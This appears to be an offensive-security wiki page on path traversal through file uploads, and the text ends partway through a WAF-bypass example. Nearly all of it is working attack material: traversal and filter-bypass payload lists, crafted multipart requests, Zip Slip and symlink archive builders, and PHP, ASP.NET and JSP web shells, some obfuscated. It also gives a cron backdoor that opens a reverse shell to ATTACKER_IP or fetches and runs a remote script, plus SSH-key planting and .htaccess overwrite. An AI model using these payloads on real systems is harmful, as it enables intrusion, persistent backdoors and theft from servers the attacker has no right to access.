---
title: Path Traversal Via Upload
description: Exploit file upload functionalities to write files to arbitrary directories using path traversal techniques, achieving remote code execution, configuration overwrite, and persistent access.
navigation:
  title: Path Traversal Via Upload
---

## Attack Overview

::callout
Path Traversal via Upload exploits insufficient filename sanitization in file upload endpoints. By injecting directory traversal sequences (`../`) into the filename, an attacker can write files outside the intended upload directory — achieving **RCE**, **config overwrite**, **cron injection**, or **SSH key planting**.
::

::card-group
  ::card
  ---
  title: Core Concept
  ---
  The server accepts a user-controlled filename and concatenates it with a base upload directory without proper sanitization. Injecting `../` sequences allows writing to arbitrary paths on the filesystem.
  ::

  ::card
  ---
  title: Impact
  ---
  Remote Code Execution, Web Shell Deployment, Configuration Overwrite, Credential Theft, Privilege Escalation, Persistent Backdoor Access, Denial of Service via File Overwrite.
  ::

  ::card
  ---
  title: Attack Surface
  ---
  Multipart form uploads, API file endpoints, avatar/profile image uploads, document import features, plugin/theme uploaders, backup restore functions, CSV/XML importers.
  ::

  ::card
  ---
  title: Root Cause
  ---
  Missing or insufficient filename sanitization, reliance on client-side validation, improper use of path concatenation functions, lack of chroot or jail on upload directories.
  ::
::

## Reconnaissance & Endpoint Discovery

### Identify Upload Endpoints

::tabs
  :::tabs-item{label="Burp Suite"}
  ```bash
  # Passive scan - review sitemap for upload endpoints
  # Filter HTTP history by:
  # - Content-Type: multipart/form-data
  # - Methods: POST, PUT, PATCH
  # - URL patterns: /upload, /import, /attach, /media, /file

  # Active scan upload forms for path traversal
  # Right-click request > Send to Intruder
  # Set payload position on filename parameter
  ```
  :::

  :::tabs-item{label="ffuf"}
  ```bash
  # Discover upload endpoints
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/upload-endpoints.txt -mc 200,301,302,405

  # Common upload paths
  ffuf -u https://target.com/FUZZ -w - -mc 200,405 <<EOF
  upload
  upload.php
  file-upload
  api/upload
  api/v1/upload
  api/files
  api/v1/files
  api/attachments
  media/upload
  admin/upload
  wp-admin/async-upload.php
  filemanager/upload
  editor/upload
  import
  restore
  backup/upload
  avatar/upload
  profile/photo
  documents/upload
  assets/upload
  EOF
  ```
  :::

  :::tabs-item{label="Gobuster"}
  ```bash
  gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 \
    --status-codes 200,301,302,405 \
    -p upload,import,file,attach,media,document

  # API endpoint discovery
  gobuster dir -u https://target.com/api/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 50
  ```
  :::

  :::tabs-item{label="Hakrawler + grep"}
  ```bash
  # Crawl and extract upload-related URLs
  echo "https://target.com" | hakrawler -d 3 -plain | grep -iE "upload|file|import|attach|media|avatar|photo|document|backup|restore"

  # Extract from JavaScript files
  echo "https://target.com" | hakrawler -d 3 -plain | grep "\.js$" | while read url; do
    curl -s "$url" | grep -oiE '["'"'"'][^"'"'"']*upload[^"'"'"']*["'"'"']'
  done
  ```
  :::
::

### Analyze Upload Behavior

::tabs
  :::tabs-item{label="curl - Basic Upload Test"}
  ```bash
  # Standard upload to observe behavior
  curl -v -X POST https://target.com/upload \
    -F "file=@test.txt;filename=test.txt" \
    -H "Cookie: session=YOUR_SESSION" \
    2>&1 | tee upload_response.txt

  # Check response for:
  # - Returned file path/URL
  # - Stored filename
  # - Upload directory disclosure
  grep -iE "path|url|location|filename|stored|directory" upload_response.txt
  ```
  :::

  :::tabs-item{label="curl - Header Analysis"}
  ```bash
  # Upload and capture all response headers
  curl -s -D- -X POST https://target.com/upload \
    -F "file=@test.txt;filename=test.txt" \
    -H "Cookie: session=YOUR_SESSION" \
    -o /dev/null

  # Check Content-Disposition for stored filename
  curl -s -D- https://target.com/uploads/test.txt | grep -i "content-disposition"

  # Verify where file was stored
  curl -s -o /dev/null -w "%{http_code}" https://target.com/uploads/test.txt
  curl -s -o /dev/null -w "%{http_code}" https://target.com/media/test.txt
  curl -s -o /dev/null -w "%{http_code}" https://target.com/static/test.txt
  curl -s -o /dev/null -w "%{http_code}" https://target.com/files/test.txt
  ```
  :::
::

::collapsible
**Upload Directory Structure Enumeration**

```bash
# Try to determine upload base path
for dir in uploads media files static assets content data tmp public storage; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$dir/")
  echo "$dir/ -> HTTP $code"
done

# Directory listing check
for dir in uploads media files static assets; do
  echo "=== $dir ==="
  curl -s "https://target.com/$dir/" | grep -oE 'href="[^"]*"' | head -20
done

# Known file access pattern detection
# Upload test.txt then try multiple retrieval paths
curl -s -X POST https://target.com/upload -F "file=@test.txt;filename=uniquename12345.txt" -H "Cookie: session=SESS"
for path in uploads media files static assets content data public storage; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path/uniquename12345.txt")
  [ "$code" != "404" ] && echo "[FOUND] https://target.com/$path/uniquename12345.txt -> HTTP $code"
done
```
::

## Filename Traversal Payloads

### Basic Traversal Sequences

::note
The core technique involves injecting `../` sequences into the filename field of the multipart upload request. The number of `../` sequences needed depends on the depth of the upload directory relative to the target write location.
::

::code-group
```bash [Basic Payloads]
# Simple traversal - write to parent directories
../shell.php
../../shell.php
../../../shell.php
../../../../shell.php
../../../../../shell.php
../../../../../../shell.php
../../../../../../../shell.php

# Target web root directly
../../../var/www/html/shell.php
../../../../var/www/html/shell.php
../../../../../../../var/www/html/shell.php

# Target specific directories
../../../tmp/shell.php
../../../etc/cron.d/backdoor
../../../root/.ssh/authorized_keys
../../.ssh/authorized_keys
```

```bash [Windows Payloads]
# Windows backslash traversal
..\shell.aspx
..\..\shell.aspx
..\..\..\shell.aspx
..\..\..\..\shell.aspx
..\..\..\..\..\shell.aspx

# Windows target paths
..\..\..\inetpub\wwwroot\shell.aspx
..\..\..\..\inetpub\wwwroot\shell.aspx
..\..\..\xampp\htdocs\shell.aspx
..\..\..\..\wamp\www\shell.aspx
..\..\..\..\..\Windows\Temp\shell.aspx
```

```bash [Mixed Separator Payloads]
# Forward + backslash mixed
..\../shell.php
../..\/shell.php
..\/..\/shell.php
.././..\./shell.php

# URL-style in filename
../\shell.php
..\./shell.php
..\/.\shell.php
```
::

### Encoded Traversal Sequences

::warning
Many WAFs and application filters check for literal `../` sequences. URL encoding, double encoding, and alternative representations can bypass these filters.
::

::tabs
  :::tabs-item{label="URL Encoding"}
  ```bash
  # Single URL encode
  %2e%2e%2fshell.php
  %2e%2e/shell.php
  ..%2fshell.php
  %2e%2e%5cshell.php
  ..%5cshell.php

  # Double URL encode
  %252e%252e%252fshell.php
  %252e%252e/shell.php
  ..%252fshell.php
  %252e%252e%255cshell.php

  # Triple URL encode
  %25252e%25252e%25252fshell.php

  # Mixed encoding
  %2e%2e%2f%2e%2e%2fshell.php
  ..%2f..%2fshell.php
  %2e%2e/%2e%2e/shell.php
  ..%2f..%2f..%2fshell.php
  ```
  :::

  :::tabs-item{label="Unicode / Overlong UTF-8"}
  ```bash
  # Unicode dot representations
  %c0%aeshell.php
  %c0%ae%c0%ae%c0%afshell.php
  %uff0e%uff0e%u2215shell.php
  %uff0e%uff0e/shell.php

  # Overlong UTF-8 encoding of '/'
  ..%c0%afshell.php
  ..%c0%af..%c0%afshell.php
  %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afshell.php

  # Overlong UTF-8 encoding of '\'
  ..%c1%9cshell.php
  ..%c1%9c..%c1%9cshell.php

  # Double encoding with unicode
  ..%25c0%25afshell.php
  %25c0%25ae%25c0%25ae%25c0%25afshell.php
  ```
  :::

  :::tabs-item{label="Null Byte Injection"}
  ```bash
  # Null byte to truncate extension checks
  ../shell.php%00.jpg
  ../shell.php%00.png
  ../shell.php%00.gif
  ../../shell.php%00.txt
  ../../../shell.php%00.pdf

  # URL encoded null byte
  ../shell.php%2500.jpg
  ../shell.php\x00.jpg

  # Null byte at different positions
  ../%00/shell.php
  ../shell%00.php
  ../shell.ph%00p
  ```
  :::

  :::tabs-item{label="Special Characters"}
  ```bash
  # Dot variations
  ....//shell.php
  ....\/shell.php
  ....\\shell.php
  ..../shell.php

  # Double dot variations
  ..;/shell.php
  ..;//shell.php
  ..\;/shell.php

  # Path normalization abuse
  ./../../shell.php
  ./../../../shell.php
  uploads/../../../shell.php
  valid/../../../../shell.php

  # Trailing characters
  ../shell.php.
  ../shell.php..
  ../shell.php...
  ../shell.php /
  ../shell.php::$DATA
  ```
  :::
::

### Complete Bypass Payload List

::code-collapse

```bash [traversal-payloads.txt]
../shell.php
../../shell.php
../../../shell.php
../../../../shell.php
../../../../../shell.php
../../../../../../shell.php
../../../../../../../shell.php
../../../../../../../../shell.php
..\shell.php
..\..\shell.php
..\..\..\shell.php
..\..\..\..\shell.php
..\..\..\..\..\shell.php
..\/shell.php
..\/..\/shell.php
..\/..\/..\/shell.php
..\../shell.php
..\../..\../shell.php
....//shell.php
....//....//shell.php
....//....//....//shell.php
....\\shell.php
....\\....\\shell.php
..;/shell.php
..;/..;/shell.php
..;/..;/..;/shell.php
%2e%2e%2fshell.php
%2e%2e%2f%2e%2e%2fshell.php
%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php
..%2fshell.php
..%2f..%2fshell.php
..%2f..%2f..%2fshell.php
%2e%2e/shell.php
%2e%2e/%2e%2e/shell.php
%2e%2e/%2e%2e/%2e%2e/shell.php
..%5cshell.php
..%5c..%5cshell.php
..%5c..%5c..%5cshell.php
%2e%2e%5cshell.php
%2e%2e%5c%2e%2e%5cshell.php
%252e%252e%252fshell.php
%252e%252e%252f%252e%252e%252fshell.php
..%252fshell.php
..%252f..%252fshell.php
%252e%252e/shell.php
%252e%252e/%252e%252e/shell.php
..%c0%afshell.php
..%c0%af..%c0%afshell.php
%c0%ae%c0%ae%c0%afshell.php
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afshell.php
..%c1%9cshell.php
..%c1%9c..%c1%9cshell.php
..%25c0%25afshell.php
..%ef%bc%8fshell.php
../shell.php%00.jpg
../../shell.php%00.png
../shell.php%00.gif
../shell.php%00.txt
../shell.php%2500.jpg
../shell.php .
../shell.php..
../shell.php::$DATA
../shell.php::$DATA.jpg
./../../shell.php
uploads/../../../shell.php
images/../../../../shell.php
```
::

## Exploitation Techniques

### Technique 1 — Direct Filename Manipulation

::steps{level="4"}

#### Capture the Upload Request

```bash
# Standard multipart upload capture via curl
curl -v -X POST https://target.com/upload \
  -F "file=@shell.php;filename=test.jpg" \
  -H "Cookie: session=YOUR_SESSION" \
  --proxy http://127.0.0.1:8080
```

#### Modify the Filename in Burp

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: session=YOUR_SESSION

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

#### Trigger the Uploaded Shell

```bash
# Access the shell at the traversed location
curl "https://target.com/shell.php?cmd=id"
curl "https://target.com/shell.php?cmd=whoami"
curl "https://target.com/shell.php?cmd=cat+/etc/passwd"

# If web root depth is unknown, try multiple levels
for i in $(seq 1 10); do
  path=$(printf '../%.0s' $(seq 1 $i))
  echo "Testing depth $i: ${path}shell.php"
  curl -s -X POST https://target.com/upload \
    -F "file=@shell.php;filename=${path}var/www/html/cmd_${i}.php" \
    -H "Cookie: session=YOUR_SESSION"
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/cmd_${i}.php?cmd=id")
  [ "$code" = "200" ] && echo "[+] SUCCESS at depth $i" && break
done
```

::

### Technique 2 — Content-Disposition Header Manipulation

::tabs
  :::tabs-item{label="Dual Filename"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=--boundary123
  
  ----boundary123
  Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="../../../shell.php"
  Content-Type: image/jpeg
  
  <?php system($_GET['cmd']); ?>
  ----boundary123--
  ```
  :::

  :::tabs-item{label="filename* Parameter"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=--boundary123
  
  ----boundary123
  Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename*=UTF-8''..%2F..%2F..%2Fshell.php
  Content-Type: image/jpeg
  
  <?php system($_GET['cmd']); ?>
  ----boundary123--
  ```
  :::

  :::tabs-item{label="Quoted vs Unquoted"}
  ```http
  # Unquoted filename - some parsers handle differently
  Content-Disposition: form-data; name="file"; filename=../../../shell.php
  
  # Single-quoted filename
  Content-Disposition: form-data; name="file"; filename='../../../shell.php'
  
  # Escaped quotes in filename
  Content-Disposition: form-data; name="file"; filename="..\/..\/..\/shell.php"
  
  # Newline injection in header
  Content-Disposition: form-data; name="file"; filename="safe.jpg
  filename="../../../shell.php"
  ```
  :::

  :::tabs-item{label="Header Injection"}
  ```http
  # CRLF injection in Content-Disposition
  Content-Disposition: form-data; name="file"; filename="safe.jpg\r\nContent-Disposition: form-data; name="file"; filename="../../../shell.php"
  
  # Tab character injection
  Content-Disposition: form-data; name="file"; filename="safe.jpg";	filename="../../../shell.php"
  
  # Semicolon manipulation
  Content-Disposition: form-data; name="file"; filename="../../../shell.php"; dummy="safe.jpg"
  ```
  :::
::

### Technique 3 — Multipart Boundary Manipulation

::code-group
```http [Boundary Confusion]
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="safe.jpg"
Content-Type: image/jpeg

JFIF_HEADER_BYTES
------boundary
Content-Disposition: form-data; name="file"; filename="../../../shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------boundary--
```

```http [Nested Multipart]
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=outer

--outer
Content-Disposition: form-data; name="file"; filename="safe.jpg"
Content-Type: multipart/mixed; boundary=inner

--inner
Content-Disposition: attachment; filename="../../../shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
--inner--
--outer--
```

```http [Duplicate Name Fields]
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----bound

------bound
Content-Disposition: form-data; name="file"; filename="safe.jpg"
Content-Type: image/jpeg

FAKE_IMAGE_DATA
------bound
Content-Disposition: form-data; name="file"; filename="../../../shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------bound--
```
::

### Technique 4 — JSON/API Upload Traversal

::tabs
  :::tabs-item{label="JSON Body"}
  ```bash
  # Base64 encoded file content with traversal filename
  curl -X POST https://target.com/api/v1/files \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{
      "filename": "../../../var/www/html/shell.php",
      "content": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
      "encoding": "base64"
    }'
  
  # Alternative JSON structures
  curl -X POST https://target.com/api/upload \
    -H "Content-Type: application/json" \
    -d '{
      "name": "../../../shell.php",
      "data": "<?php system($_GET[\"cmd\"]); ?>",
      "path": "uploads"
    }'
  
  # Nested path parameter
  curl -X POST https://target.com/api/upload \
    -H "Content-Type: application/json" \
    -d '{
      "file": {
        "name": "safe.jpg",
        "path": "../../../var/www/html/",
        "content": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
      }
    }'
  ```
  :::

  :::tabs-item{label="Path Parameter Injection"}
  ```bash
  # Traversal in upload path/directory parameter
  curl -X POST "https://target.com/api/upload?path=../../../var/www/html/" \
    -F "file=@shell.php;filename=shell.php" \
    -H "Cookie: session=SESS"
  
  # Traversal in folder parameter
  curl -X POST https://target.com/api/upload \
    -F "file=@shell.php" \
    -F "folder=../../../var/www/html" \
    -H "Cookie: session=SESS"
  
  # Traversal in destination header
  curl -X PUT https://target.com/api/files/shell.php \
    -H "Destination: ../../../var/www/html/shell.php" \
    -H "Content-Type: application/octet-stream" \
    -d '<?php system($_GET["cmd"]); ?>'
  
  # Traversal via X-File-Name header
  curl -X POST https://target.com/api/upload \
    -H "X-File-Name: ../../../shell.php" \
    -H "Content-Type: application/octet-stream" \
    -d '<?php system($_GET["cmd"]); ?>'
  ```
  :::
::

### Technique 5 — Archive Extraction Traversal (Zip Slip)

::caution
Zip Slip exploits file extraction routines that fail to validate filenames inside archive files. A crafted archive containing files with traversal paths can write to arbitrary locations when extracted server-side.
::

::tabs
  :::tabs-item{label="Python - Craft Malicious Zip"}
  ```python
  #!/usr/bin/env python3
  import zipfile
  import sys
  
  def create_zipslip(output_file, payload_file, traversal_path):
      with zipfile.ZipFile(output_file, 'w') as zf:
          # Add a legitimate file
          zf.writestr("legitimate.txt", "This is a normal file")
          
          # Add the traversal payload
          zf.write(payload_file, traversal_path)
      print(f"[+] Created {output_file} with entry: {traversal_path}")
  
  # Usage examples
  create_zipslip(
      "evil.zip",
      "shell.php",
      "../../../var/www/html/shell.php"
  )
  
  create_zipslip(
      "evil_win.zip",
      "shell.aspx",
      "..\\..\\..\\inetpub\\wwwroot\\shell.aspx"
  )
  
  # Multiple traversal depths
  for depth in range(1, 8):
      path = "../" * depth + "var/www/html/shell.php"
      create_zipslip(f"evil_d{depth}.zip", "shell.php", path)
  ```
  :::

  :::tabs-item{label="evilarc.py"}
  ```bash
  # Using evilarc to create malicious archives
  # https://github.com/ptoomey3/evilarc
  
  # Basic zip with traversal
  python evilarc.py shell.php -o unix -d 5 -p "var/www/html" -f evil.zip
  
  # Windows target
  python evilarc.py shell.aspx -o win -d 5 -p "inetpub/wwwroot" -f evil_win.zip
  
  # Tar.gz archive
  python evilarc.py shell.php -o unix -d 5 -p "var/www/html" -f evil.tar.gz
  
  # Multiple files in one archive
  python evilarc.py shell.php -o unix -d 3 -p "var/www/html" -f evil.zip
  python evilarc.py -a evil.zip cron_backdoor -o unix -d 3 -p "etc/cron.d"
  python evilarc.py -a evil.zip authorized_keys -o unix -d 3 -p "root/.ssh"
  ```
  :::

  :::tabs-item{label="Manual Zip Crafting"}
  ```bash
  # Create zip with symlink traversal
  ln -s ../../../etc/passwd link_passwd
  zip --symlinks evil_symlink.zip link_passwd
  
  # Create tar with traversal paths
  # First create the directory structure
  mkdir -p "$(printf '../%.0s' $(seq 1 5))var/www/html"
  cp shell.php "$(printf '../%.0s' $(seq 1 5))var/www/html/shell.php"
  tar czf evil.tar.gz "$(printf '../%.0s' $(seq 1 5))var/www/html/shell.php"
  
  # Using zipnote to modify existing zip
  cp clean.zip evil.zip
  zipnote evil.zip > notes.txt
  # Edit notes.txt to change internal filenames
  sed -i 's|safe.jpg|../../../var/www/html/shell.php|g' notes.txt
  zipnote -w evil.zip < notes.txt
  
  # Verify contents
  unzip -l evil.zip
  zipinfo evil.zip
  ```
  :::

  :::tabs-item{label="Upload & Trigger"}
  ```bash
  # Upload malicious zip for server-side extraction
  curl -X POST https://target.com/api/import \
    -F "archive=@evil.zip" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/upload/extract \
    -F "file=@evil.zip;type=application/zip" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/api/plugins/install \
    -F "plugin=@evil.zip" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/api/themes/upload \
    -F "theme=@evil.tar.gz" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/api/restore \
    -F "backup=@evil.zip" \
    -H "Cookie: session=SESS"
  
  # Verify shell deployment
  curl "https://target.com/shell.php?cmd=id"
  ```
  :::
::

### Technique 6 — Symlink Upload Attack

::code-group
```bash [Create Symlink Archives]
# Create symlink pointing to sensitive file
ln -s /etc/passwd symlink_passwd
ln -s /etc/shadow symlink_shadow
ln -s /root/.ssh/id_rsa symlink_key
ln -s /var/www/html/.env symlink_env
ln -s /proc/self/environ symlink_environ

# Create tar preserving symlinks
tar czf symlink_attack.tar.gz symlink_passwd symlink_shadow symlink_key symlink_env

# Create zip preserving symlinks
zip --symlinks symlink_attack.zip symlink_passwd symlink_shadow symlink_key symlink_env

# Two-stage symlink attack
# Stage 1: Upload symlink pointing to target directory
ln -s /var/www/html webroot_link
tar czf stage1.tar.gz webroot_link

# Stage 2: Upload file through the symlink
# After extraction, upload shell.php to webroot_link/shell.php
```

```bash [Upload Symlink Archive]
# Upload and trigger extraction
curl -X POST https://target.com/upload \
  -F "file=@symlink_attack.tar.gz" \
  -H "Cookie: session=SESS"

# Access the symlinked files after extraction
curl https://target.com/uploads/symlink_passwd
curl https://target.com/uploads/symlink_shadow
curl https://target.com/uploads/symlink_key
curl https://target.com/uploads/symlink_env
```
::

## Target Write Locations

::accordion
  :::accordion-item{label="Linux Web Root Paths"}
  ```bash
  # Apache
  ../../../var/www/html/shell.php
  ../../../var/www/shell.php
  ../../../srv/www/htdocs/shell.php
  ../../../usr/share/nginx/html/shell.php
  ../../../opt/lampp/htdocs/shell.php
  ../../../var/www/vhosts/target.com/httpdocs/shell.php

  # Nginx
  ../../../usr/share/nginx/html/shell.php
  ../../../var/www/html/shell.php

  # Application specific
  ../../../opt/app/public/shell.php
  ../../../home/user/public_html/shell.php
  ../../../srv/http/shell.php
  ```
  :::

  :::accordion-item{label="Windows Web Root Paths"}
  ```bash
  ..\..\..\inetpub\wwwroot\shell.aspx
  ..\..\..\inetpub\wwwroot\shell.asp
  ..\..\..\xampp\htdocs\shell.php
  ..\..\..\wamp\www\shell.php
  ..\..\..\wamp64\www\shell.php
  ..\..\..\..\Program Files\Apache\htdocs\shell.php
  ..\..\..\..\Program Files (x86)\Apache\htdocs\shell.php
  ..\..\..\nginx\html\shell.php
  ..\..\..\wwwroot\shell.aspx
  ```
  :::

  :::accordion-item{label="Configuration Overwrite Targets"}
  ```bash
  # SSH authorized_keys (Linux)
  ../../../root/.ssh/authorized_keys
  ../../../home/USER/.ssh/authorized_keys
  ../../.ssh/authorized_keys

  # Cron jobs (Linux)
  ../../../etc/cron.d/backdoor
  ../../../var/spool/cron/root
  ../../../var/spool/cron/crontabs/root
  ../../../etc/crontab

  # Apache/Nginx config
  ../../../etc/apache2/sites-enabled/backdoor.conf
  ../../../etc/nginx/sites-enabled/backdoor.conf
  ../../../etc/apache2/conf.d/backdoor.conf
  ../../../etc/httpd/conf.d/backdoor.conf

  # Application config
  ../../../var/www/html/.htaccess
  ../../../var/www/html/wp-config.php
  ../../../var/www/html/.env
  ../../../var/www/html/config/database.yml
  ../../../var/www/html/config/secrets.yml
  ```
  :::

  :::accordion-item{label="Writable World Directories"}
  ```bash
  # Always writable
  ../../../tmp/shell.php
  ../../../var/tmp/shell.php
  ../../../dev/shm/shell.php

  # Log directories (potential log poisoning chain)
  ../../../var/log/apache2/shell.php
  ../../../var/log/nginx/shell.php
  ../../../var/log/httpd/shell.php
  ```
  :::
::

## Web Shell Payloads

### PHP Shells

::tabs
  :::tabs-item{label="Minimal"}
  ```php
  <?php system($_GET['cmd']); ?>
  ```
  :::

  :::tabs-item{label="Eval-Based"}
  ```php
  <?php eval($_POST['code']); ?>
  ```
  :::

  :::tabs-item{label="Multi-Function"}
  ```php
  <?php
  if(isset($_REQUEST['cmd'])){
      echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
  }
  if(isset($_REQUEST['dl'])){
      echo file_get_contents($_REQUEST['dl']);
  }
  if(isset($_FILES['up'])){
      move_uploaded_file($_FILES['up']['tmp_name'], $_REQUEST['to']);
  }
  ?>
  ```
  :::

  :::tabs-item{label="Obfuscated"}
  ```php
  <?php $k='sys'.'tem';$k($_GET['c']); ?>
  <?php $_='{'^'<';$__='$'.$_;$$__[_]($$__[__]); ?>
  <?php $a=str_rot13('flfgrz');$a($_GET['cmd']); ?>
  <?php $x=base64_decode('c3lzdGVt');$x($_GET['cmd']); ?>
  <?php array_map(function($a){system($a);}, [$_GET['cmd']]); ?>
  <?php (new ReflectionFunction('system'))->invoke($_GET['cmd']); ?>
  <?php preg_replace('/.*/e', 'system($_GET["cmd"])', ''); ?>
  <?php $f=create_function('$a','system($a);');$f($_GET['cmd']); ?>
  ```
  :::

  :::tabs-item{label="GIF Header Bypass"}
  ```php
  GIF89a;
  <?php system($_GET['cmd']); ?>
  ```
  :::
::

### Other Language Shells

::code-group
```aspx [ASP.NET Shell]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```

```jsp [JSP Shell]
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
```

```python [Python Flask/WSGI]
import os
def application(environ, start_response):
    cmd = environ.get('QUERY_STRING', '').split('cmd=')[1] if 'cmd=' in environ.get('QUERY_STRING', '') else ''
    output = os.popen(cmd).read() if cmd else 'No command'
    start_response('200 OK', [('Content-Type', 'text/plain')])
    return [output.encode()]
```
::

### Persistence Payloads

::code-group
```bash [SSH Key Injection]
# Generate key pair
ssh-keygen -t ed25519 -f traversal_key -N ""

# Content for authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... attacker@box" > authorized_keys

# Upload via traversal
curl -X POST https://target.com/upload \
  -F "file=@authorized_keys;filename=../../../root/.ssh/authorized_keys" \
  -H "Cookie: session=SESS"

curl -X POST https://target.com/upload \
  -F "file=@authorized_keys;filename=../../../home/www-data/.ssh/authorized_keys" \
  -H "Cookie: session=SESS"

# Connect
ssh -i traversal_key root@target.com
ssh -i traversal_key www-data@target.com
```

```bash [Cron Backdoor]
# Create cron payload
cat > cron_backdoor << 'EOF'
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
EOF

# Alternative: Download and execute
cat > cron_backdoor << 'EOF'
*/5 * * * * root curl http://ATTACKER_IP/payload.sh | bash
EOF

# Upload to cron directory
curl -X POST https://target.com/upload \
  -F "file=@cron_backdoor;filename=../../../etc/cron.d/backdoor" \
  -H "Cookie: session=SESS"

# Listener
nc -lvnp 4444
```

```bash [.htaccess Overwrite]
# Enable PHP execution in upload directory
cat > htaccess_payload << 'EOF'
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg
Options +ExecCGI
EOF

# Upload .htaccess
curl -X POST https://target.com/upload \
  -F "file=@htaccess_payload;filename=../../../var/www/html/uploads/.htaccess" \
  -H "Cookie: session=SESS"

# Now upload shell with .jpg extension - it executes as PHP
curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.jpg" \
  -H "Cookie: session=SESS"

curl "https://target.com/uploads/shell.jpg?cmd=id"
```
::

## Filter Bypass Strategies

### Filename Sanitization Bypasses

::accordion
  :::accordion-item{label="Regex Bypass Techniques"}
  ```bash
  # If filter removes "../" once (non-recursive)
  ....//shell.php          # becomes ../shell.php
  ....\/shell.php          # mixed separators
  ....\\shell.php          # double backslash
  ..../shell.php           # extra dot
  ....//....//shell.php    # double bypass

  # If filter removes ".." (non-recursive)
  ....//shell.php
  .?./shell.php            # if regex is /\.\./
  %2e./shell.php           # partial encode

  # If filter blocks sequences starting with ../
  uploads/../../../shell.php
  ./../../shell.php
  foo/../../../shell.php
  valid/path/../../../../shell.php
  images/../../../shell.php

  # If filter only checks beginning of filename
  safe_prefix/../../../shell.php
  image_../../../shell.php
  ```
  :::

  :::accordion-item{label="Path Normalization Abuse"}
  ```bash
  # Exploiting OS path normalization
  ../././../././shell.php
  ..///////../////shell.php
  ../\../\shell.php
  ..\/..\/..\/ shell.php

  # Case sensitivity (Windows)
  ..\SHELL.PHP
  ..\Shell.Php
  ..\shell.PhP

  # 8.3 short filename (Windows)
  ..\..\..\INETPU~1\WWWROO~1\shell.aspx

  # UNC path (Windows)
  \\?\..\..\..\..\inetpub\wwwroot\shell.aspx
  ```
  :::

  :::accordion-item{label="Content-Type Manipulation"}
  ```bash
  # Set benign Content-Type while uploading shell
  Content-Type: image/jpeg
  Content-Type: image/png
  Content-Type: image/gif
  Content-Type: application/pdf
  Content-Type: text/plain
  Content-Type: application/octet-stream

  # Empty Content-Type
  Content-Type:

  # Invalid Content-Type
  Content-Type: invalid/type
  Content-Type: xyz

  # Multiple Content-Type values
  Content-Type: image/jpeg, application/x-php
  ```
  :::

  :::accordion-item{label="Extension Filter Bypass"}
  ```bash
  # When traversal works but extension is blocked
  ../shell.php5
  ../shell.phtml
  ../shell.pht
  ../shell.pHp
  ../shell.php3
  ../shell.php4
  ../shell.php7
  ../shell.phps
  ../shell.phar
  ../shell.pgif
  ../shell.shtml
  ../shell.inc
  ../shell.module

  # Double extension
  ../shell.php.jpg
  ../shell.php.png
  ../shell.jpg.php
  ../shell.php.xxxxx

  # Null byte (older systems)
  ../shell.php%00.jpg
  ../shell.php\x00.jpg

  # Alternate data streams (Windows)
  ../shell.php::$DATA
  ../shell.php::$DATA.jpg

  # Trailing characters
  ../shell.php.
  ../shell.php..
  ../shell.php...
  ../shell.php%20
  ../shell.php%0a
  ../shell.php%0d%0a
  ```
  :::
::

### WAF Bypass Techniques

::tabs
  :::tabs-item{label="Chunked Transfer"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Transfer-Encoding: chunked
  Content-Type: multipart/form-data; boundary=abc
  
  5
  --abc
  6e
  
